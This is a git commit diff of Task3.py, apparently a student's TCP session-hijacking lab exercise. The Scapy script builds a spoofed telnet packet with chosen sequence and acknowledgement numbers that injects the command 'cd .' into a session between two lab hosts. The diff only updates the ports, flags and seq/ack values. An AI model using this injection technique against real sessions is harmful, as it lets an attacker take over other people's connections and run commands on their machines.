30d376e987277778c31733b79484f63e25b418bb
Ethan Harris <576552241qwj@gmail.com>
2021-12-06 09:30:54 +0800

    main

--- Task3.py
+++ Task3.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 from scapy.all import *
 ip  = IP(src="10.9.0.6", dst="10.9.0.5")
-tcp = TCP(sport=59948, dport=23, flags="A", seq=183752945, ack=760448229)
+tcp = TCP(sport=59956, dport=23, flags="AP", seq=1724373313, ack=3460737540)
 data = "cd .\r"
 pkt = ip/tcp/data
 ls(pkt)
